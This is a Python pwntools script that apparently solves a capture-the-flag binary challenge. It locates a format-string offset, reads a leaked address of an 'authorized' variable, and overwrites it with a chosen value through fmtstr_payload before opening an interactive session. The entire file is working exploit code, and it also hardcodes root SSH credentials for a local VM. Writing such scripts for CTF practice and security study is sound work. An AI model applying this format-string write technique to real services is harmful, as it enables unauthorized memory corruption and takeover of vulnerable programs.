from pwn import *

VM_HOST, VM_PORT = "192.168.10.135", 22 # My VM Server
HOST, PORT = "addr", 1234
cwd = "/root/workbench/PWN/pwn04/p02"

exe = ELF("./chall",checksec=False)
context.binary = exe
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        sh = ssh(host=VM_HOST, port=VM_PORT, user="root", password="password")
        p = sh.process([f"{cwd}/chall"], cwd=cwd)
        gdb.attach(p)
    else:
        p = remote(HOST, PORT)
    return p

def exec_fmt(payload):
    sh = ssh(host=VM_HOST, port=VM_PORT, user="root", password="password")
    p = sh.process([f"{cwd}/chall"], cwd=cwd)
    p.sendline(payload)
    data = p.recvall(timeout=0.2)
    p.close()
    return data

def main():
    fmt = FmtStr(exec_fmt)
    offset = fmt.offset
    # === Alias === #
    p = conn()
    s = p.send
    sl = p.sendline
    sla = p.sendlineafter
    sa = p.sendafter
    r = p.recv
    ru = p.recvuntil
    rn = p.recvn
    rl = p.recvline
    # === Exploit === #
    log.info("happy pwn!")
    ru(b"= ")
    authorized = int(rn(8), 16)
    log.success(f"authorized = {hex(authorized)}")
    log.success(f"offset = {offset}")
    payload = fmtstr_payload(offset, {authorized: 322376503})
    log.success(f"payload = {payload}")
    sla(b"format> ", payload)
    # =============== #
    p.interactive()

if __name__ == "__main__":
    main()